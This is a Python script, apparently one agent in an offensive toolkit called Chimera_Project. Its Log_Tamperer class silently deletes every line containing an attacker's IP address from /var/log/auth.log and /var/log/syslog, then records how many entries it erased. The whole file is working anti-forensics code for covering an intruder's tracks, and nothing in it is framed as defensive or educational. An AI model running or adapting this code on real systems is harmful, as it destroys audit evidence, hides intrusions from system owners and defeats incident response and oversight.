import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import logging

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Log_Tamperer:
    def __init__(self):
        self.agent_id = "76"
        self.name = "Log_Tamperer"
        self.db = ChimeraDB()
        self.target_logs = ["/var/log/auth.log", "/var/log/syslog"]
        # In a real scenario, this would be your Kali IP
        self.my_ip = "192.168.1.100" 

    def scrub_logs(self):
        """Silently removes any line containing the attacker's IP."""
        for log_path in self.target_logs:
            if not os.path.exists(log_path):
                continue
            
            try:
                with open(log_path, "r") as f:
                    lines = f.readlines()
                
                # Keep only lines that DO NOT have our IP
                clean_lines = [line for line in lines if self.my_ip not in line]
                
                if len(lines) != len(clean_lines):
                    with open(log_path, "w") as f:
                        f.writelines(clean_lines)
                    self.logger.warning(f"[+] Scrubbed {len(lines) - len(clean_lines)} entries from {log_path}")
            except PermissionError:
                self.logger.error(f"Failed to scrub {log_path}: Need Root/Sudo.")

    def run(self):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        self.scrub_logs()
        self.db.close()

if __name__ == "__main__":
    agent = Log_Tamperer()
    agent.run()
